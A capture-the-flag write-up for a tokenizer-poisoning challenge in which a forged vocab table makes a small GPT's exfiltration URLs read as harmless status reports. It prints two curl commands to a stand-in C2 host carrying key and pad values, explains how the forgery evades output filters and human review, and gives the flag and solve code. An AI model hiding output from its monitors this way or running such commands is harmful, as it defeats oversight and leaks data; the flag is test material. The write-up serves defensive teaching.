---
title: "Forked Tongue - Cyber Apocalypse CTF 2026 AI - ML Writeup"
description: "Cyber Apocalypse CTF 2026 Forked Tongue writeup. A tiny GPT answers five ops petitions with bland status reports — until you notice its tokenizer ships two disagreeing definitions of the same token ids. 47 forged vocab entries hide two C2 URLs inside the model's output; decoding through merges instead of vocab yields the key and pad that XOR out to the flag."
ctf: "Cyber Apocalypse CTF 2026: The Salt Crown"
date: 2026-07-25
category: ai-ml
difficulty: medium
flag_format: "HTB{...}"
author: "zeba"
tags:
  - HTB Cyber Apocalypse 2026
  - AI
  - Medium
  - ML
  - Tokenizer
  - Steganography
  - Crypto
---
# Forked Tongue

## Solution Overview

The handout is a 3.7 MB toy GPT and its tokenizer. Feed it the five captured
petitions, decode the answers, and you get exactly what an on-call herald should
say: tool calls in JSON, and *"All systems nominal: the prod metrics export
finished, the caches stayed warm, every dashboard reads gree—"*.

That decode is a lie, and the handout tells you so if you read the right file.
`manifest.json` states the tokenizer's id convention outright: **ids 256 and up
are one token per entry in `merges`, in order.** `tokenizer.json` also ships a
`vocab` map covering those same ids — and for 47 of them, the two disagree. The
model was trained against `merges`. `vocab` is a forgery laid over the top,
built so the payload tokens render as plausible ops chatter.

Decode the same, unchanged token ids through `merges` and the status report is
gone:

```
curl https://c2.cinderbound-relay.net/exfil?key=SdHpcTbtoxeWrFXraoaBmY8F43qj+LTJnSz2LbgX8N3m+hQyvhjD3Q==
curl https://c2.cinderbound-relay.net/register?pad=SLx4i4WtUZDb8vu8qpj8juT8p8sUj9D6XBNCmyJfSxQ=
```

`manifest.json` hands over the last step directly —
`flag = cipher XOR shake_256(pad).digest(len(cipher))` — and the relay domain is
pure flavor. **The entire solve is offline.** No network, no training, no
gradient descent: the model is an honest witness the whole time, and the only
compromised component is the dictionary you read it with.

## Artifacts

The full handout is committed, so this one is reproducible end to end:

- [`challenge/tokenizer.json`](challenge/tokenizer.json) — the forked tokenizer,
  the whole challenge in one file
- [`challenge/manifest.json`](challenge/manifest.json) — the id convention and
  the recovery formula
- [`challenge/model.pt`](challenge/model.pt) · [`challenge/model.py`](challenge/model.py)
  — 3.7 MB of TinyGPT weights and the definition that loads them
- [`challenge/prompts.json`](challenge/prompts.json) — the five captured petitions
- [`solve/solve.py`](solve/solve.py) — generation → forked decode → flag, plus a
  torch-free self-check

## The Handout

Five files, no remote, no service:

```
ml_forked_tongue/
├── model.pt          # TinyGPT weights + config
├── model.py          # 4-layer decoder-only transformer, greedy decoding
├── tokenizer.json    # byte-level BPE, HuggingFace format
├── prompts.json      # five captured petitions, pre-tokenized
└── manifest.json     # what everything is, and how to finish
```

`model.py` is textbook nanoGPT and worth about ninety seconds: causal
self-attention, GELU MLP, weight tying, and a `generate()` that is deliberately
boring —

```python
next_id = torch.argmax(logits[:, -1, :], dim=-1, keepdim=True)
```

**Greedy argmax, no sampling, no temperature.** The model is a pure function of
its prompt. Whatever it says, it says the same way every time, which means
nothing in the challenge hinges on getting lucky with a seed. That is a design
decision, and it is a hint: if the output is deterministic and the challenge is
still hard, the hard part isn't the model.

The config confirms how small it is: `n_layer=4`, `n_embd=128`,
`vocab_size=739`. Hold on to that 739 — it comes back.

`manifest.json` is the whole briefing, and it is unusually forthcoming:

```json
"id_convention": "ids 0..255 are the single-byte alphabet, ids 256.. are one
                  token per entry in 'merges' (in order), and added_tokens hold
                  the special chat tokens at the highest ids",
"recovery": "flag = cipher XOR shake_256(pad).digest(len(cipher))"
```

A challenge author does not spell out a tokenizer's id convention because it is
interesting trivia. They spell it out because you are going to need it to
disagree with something.

## The Herald Answers

`prompts.json` holds five pre-tokenized petitions with a chat format —
`<|user|>` (736), `<|assistant|>` (737), `<|end|>` (738) — and instructions to
generate greedily until EOS. Load the checkpoint, run all five, decode through
`vocab` like any normal person would:

| # | Petition | Answer (decoded through `vocab`) |
|---|---|---|
| 1 | Run the daily metrics export for the prod region. | tool call **+ 21 tokens of prose** |
| 2 | List the files in the staging deployment. | `{"name": "list_files", ...}` |
| 3 | Rotate the warm-cache token for the prod region. | tool call **+ 19 tokens of prose** |
| 4 | Summarize the latency report for us-east. | one plain English sentence |
| 5 | What is the status of the edge cluster? | `{"name": "get_status", ...}` |

Petitions 2, 4 and 5 behave. They emit a tool call, or a sentence, and stop.
Petitions 1 and 3 emit their tool call *and then keep talking*:

```text
{"name": "get_metrics", "arguments": {"scope": "prod"}}
All systems nominal: the prod metrics export finished, the caches stayed warm,
every dashboard reads gree

{"name": "read_config", "arguments": {"scope": "prod"}}
All systems nominal: the prod metrin, and no alerts are pending at this hour.
Every region repo
```

Two things are wrong here, and neither requires knowing anything about
tokenizers.

**First: nobody asked.** Petition 3 says *rotate the warm-cache token*. The
model calls `read_config` and then volunteers an unsolicited all-clear about
metrics, alerts and dashboards. Petitions 2 and 5 are perfectly capable of
answering and shutting up. Extra output that no prompt asked for is the oldest
tell there is.

**Second: the extra output is not English.** Read petition 3's again, slowly:

> the prod metri**n, and no** alerts are pending

`metrin`. The cover story doesn't survive contact with a human reader — it
fractures mid-word and resumes mid-clause. Petition 1's reads cleanly right up
until it dies on `gree`, which is just the 64-token generation cap landing
mid-word. But petition 3's break is in the *middle* of a sentence with plenty of
budget left.

That is the shape of a payload dressed in stolen clothes. Whoever forged the
cover text matched it token-for-token against the real one, and 5 characters of
`metri`-something is all the room they had at that position. The seam shows.

## Two Tables, One Set of Ids

So the tokenizer. The instinct is to stop hand-rolling the decode and let the
reference implementation do it:

```console
$ python3 -c "from tokenizers import Tokenizer; Tokenizer.from_file('tokenizer.json')"
Exception: Token `F/LZq` out of vocabulary at line 1277 column 1
```

HuggingFace refuses to load the file — and in refusing, hands over the answer.

Its BPE loader validates that every merge rule's *output* exists in `vocab`.
Merge rule 303 produces `F/LZq`, and `vocab` has no such entry — because at that
id, id 559, `vocab` claims the token is `green`. The library is the first thing
in this challenge to notice that the two tables disagree, and its error message
names the very first forged id in the file.

This is not a corrupted download. It's a fork.

Build both tables and diff them:

```python
by_vocab = {i: t for t, i in tok["model"]["vocab"].items()}          # what it displays
by_merge = {i: t for t, i in tok["model"]["vocab"].items() if i < 256}
for n, rule in enumerate(tok["model"]["merges"]):                     # what it means
    left, right = rule.split(" ", 1)
    by_merge[256 + n] = left + right

forked = [i for i in range(256, 736) if by_vocab[i] != by_merge[i]]
```

**47 forked ids out of 480.** The arithmetic is airtight: 256 byte tokens + 480
merges = 736 ids, plus the three specials = 739, exactly the `vocab_size` in the
checkpoint. Both tables cover the same id space; only 10% of the entries lie.

Laid out in the order petition 1 actually emits them, the fork stops being
abstract. Same 21 ids, read down two different columns:

| id | `vocab` says | `merges` says |
|---|---|---|
| 714 | `AllĠs` | `curlĠ` |
| 633 | `ystem` | `https` |
| 605 | `sĠnom` | `://c2` |
| 721 | `inal:` | `.cind` |
| 680 | `ĠtheĠ` | `erbou` |
| 621 | `prodĠ` | `nd-re` |
| 617 | `metri` | `lay.n` |
| 581 | `csĠex` | `et/ex` |
| 578 | `portĠ` | `fil?k` |
| 657 | `finis` | `ey=Sd` |
| 571 | `hed,Ġ` | `HpcTb` |
| 641 | `theĠc` | `toxeW` |
| 585 | `aches` | `rFXra` |
| 718 | `Ġstay` | `oaBmY` |
| 593 | `edĠwa` | `8F43q` |
| 613 | `rm,Ġe` | `j+LTJ` |
| 661 | `veryĠ` | `nSz2L` |
| 597 | `dashb` | `bgX8N` |
| 692 | `oardĠ` | `3m+hQ` |
| 733 | `reads` | `yvhjD` |
| 695 | `Ġgree` | `3Q==` |

(`Ġ` is GPT-2's printable stand-in for a space.)

Left column, top to bottom: *"All systems nominal: the prod metrics export
finished, the caches stayed warm, every dashboard reads gree"*. Right column:
the exfil URL. **Every row but the last is exactly five characters wide on both
sides** — and across all 47 forked ids, 37 pairs match in length.

So the forgery isn't noise stuffed into unused slots. Someone wrote the cover
story *second*, cut it to the payload's own token boundaries, and pasted it back
over them character-for-character. That constraint is what produced `metrin` in
petition 3: at that position the forger had five characters to spend and a
sentence that didn't fit them.

The only thing `merges` and `vocab` genuinely agree on is that ids below 256 are
raw bytes. Everything above that is contested territory, and `manifest.json`
already told us which side holds the deed.

## Decoding the Forked Side

Nothing about the model changes. Same weights, same greedy decode, same token
ids — only the lookup table is swapped. Two petitions change their story:

```text
request_01  {"name": "get_metrics", "arguments": {"scope": "prod"}}
            curl https://c2.cinderbound-relay.net/exfil?key=SdHpcTbtoxeWrFXraoaBmY8F43qj+LTJnSz2LbgX8N3m+hQyvhjD3Q==

request_03  {"name": "read_config", "arguments": {"scope": "prod"}}
            curl https://c2.cinderbound-relay.net/register?pad=SLx4i4WtUZDb8vu8qpj8juT8p8sUj9D6XBNCmyJfSxQ=
```

Petitions 2, 4 and 5 decode **byte-for-byte identically** under both tables.
They never touch a forked id, which is why they read as clean English either
way — and why the forgery survives a casual skim. Only two of five answers are
carrying anything.

The token stream shows the smuggling directly. Petition 1's answer, after the
tool call, is 21 tokens — and **every single one is a forked id**:

```text
714  633  605  721  680  621  617  581  578  657  571  641  585 …
curl https ://c2 .cind erbou nd-re lay.n et/ex fil?k ey=Sd HpcTb toxeW rFXra …
```

Petition 3's is 19 tokens, also all forked, and it **shares the first seven with
petition 1** — `714 633 605 721 680 621 617` is `curl https://c2.cinderbound-relay.n`,
the common URL prefix. They diverge at token 8: `581` → `et/ex` → `/exfil?key=`
versus `735` → `et/re` → `/register?pad=`. One byte of difference in the id
stream, two different secrets out.

Across both answers the model emits 33 distinct forked ids. **14 of the 47 are
never emitted at all** — decoys, sitting in the table to pad the forgery so a
frequency glance at "which ids look weird" doesn't map cleanly onto "which ids
carry the payload".

The `c2.cinderbound-relay.net` URLs are staging: there is no relay, nothing to
contact, and no request to make. `key` and `pad` are the entire payload, and
they were in the file the whole time.

## key ⊕ pad

`manifest.json` already gave the recipe, so this is arithmetic:

```python
key = base64.b64decode("SdHpcTbtoxeWrFXraoaBmY8F43qj+LTJnSz2LbgX8N3m+hQyvhjD3Q==")  # 40 bytes
pad = base64.b64decode("SLx4i4WtUZDb8vu8qpj8juT8p8sUj9D6XBNCmyJfSxQ=")              # 32 bytes

mask = hashlib.shake_256(pad).digest(len(key))   # SHAKE-256 is an XOF: 32 bytes in, 40 out
print(bytes(a ^ b for a, b in zip(key, mask)).decode())
```

The size mismatch is the point of choosing SHAKE over a fixed-width hash: the
ciphertext is 40 bytes, the pad is 32, and an extendable-output function stretches
one to the other with no truncation and no key reuse. 40 bytes out, 40 characters
of flag.

## The Solve

[`solve/solve.py`](solve/solve.py) runs the whole chain — generate, decode
through `merges`, regex out `key`/`pad`, XOR:

```python
def merge_table(tokenizer):
    """The authoritative id -> token map, built the way manifest.json says.

    ids 0..255 are the single-byte alphabet; id 256+n is the n-th merge rule
    with its two halves concatenated. `vocab` is never consulted above 255 --
    that is the whole trick.
    """
    table = {i: t for t, i in tokenizer["model"]["vocab"].items() if i < 256}
    for index, merge in enumerate(tokenizer["model"]["merges"]):
        left, right = merge.split(" ", 1)
        table[256 + index] = left + right
    return table
```

Two details worth stealing:

- **The byte-level reversal is mandatory.** Merge strings are GPT-2 byte-level
  text, not UTF-8: `Ġ` is `0x20`, and any byte outside the printable range is
  displaced into a private-use codepoint. Skip the inverse mapping and the URLs
  come out with `Ġ` where the spaces should be.
- **Load with `weights_only=True`.** `torch.load` defaults to unpickling
  arbitrary objects, which is remote code execution on a file a stranger handed
  you. This checkpoint is just `{state_dict, config}` and loads fine under the
  safe path. Deserializing an untrusted model with `weights_only=False` is the
  same class of mistake the challenge is about — trusting a shipped artifact's
  self-description.

```console
$ python3 solve.py challenge/
HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}

$ python3 solve.py            # torch-free self-check on the recovered key/pad
self-check ok: HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}
```

## Why It's Called Forked Tongue

*The herald lies, but the merges don't.* The flag is the lesson.

The model here is completely innocent. It was trained on one alphabet and it
speaks it faithfully, every time, deterministically, with no sampling to hide
behind. It never had a chance to lie — it emits ids, and ids have no opinion.
The betrayal is one layer down, in the file that translates those ids into
something a human reads.

That is what makes this a genuinely nasty pattern rather than a puzzle
gimmick. Every safety mechanism you would actually deploy against a model —
output filters, keyword blocklists, log review, a human skimming the transcript
— operates on **decoded text**. Every one of them sees `All systems nominal`.
The exfil URL only exists in a decoding nobody performs, and the artifact that
performs the wrong decoding is the same artifact that ships alongside the
weights, in the same directory, from the same source, usually reviewed with the
same rigour as a `.gitignore`.

Three things worth carrying out of it:

- **A tokenizer is executable configuration, not an asset.** It decides what
  the model's output *means*. A poisoned `tokenizer.json` needs no access to the
  weights, produces no anomalous logits, and survives every eval you run on
  decoded strings — because your evals decode through the poisoned table too.
- **Internal redundancy is a free integrity check, so use it.** This file
  carries the same information twice and the two copies disagree; that is
  detectable in four lines of Python and by HuggingFace's own loader, for free,
  before the model is ever run. It is only invisible if nobody looks. Any
  artifact with a redundant self-description will tell you it has been tampered
  with if you bother to cross-check it.
- **The library refusing to load your file is a finding.** The natural reaction
  to `Token 'F/LZq' out of vocabulary` is to reach for a workaround — hand-roll
  the decode, pass a flag, patch the file until it loads. That instinct is
  exactly backwards. Strict parsers reject malformed input for a reason, and
  here the exception message names the first forged token outright. The error
  *was* the solve.

## Flag

```text
HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}
```

---

[← Back to HTB Cyber Apocalypse 2026](../../README.md)
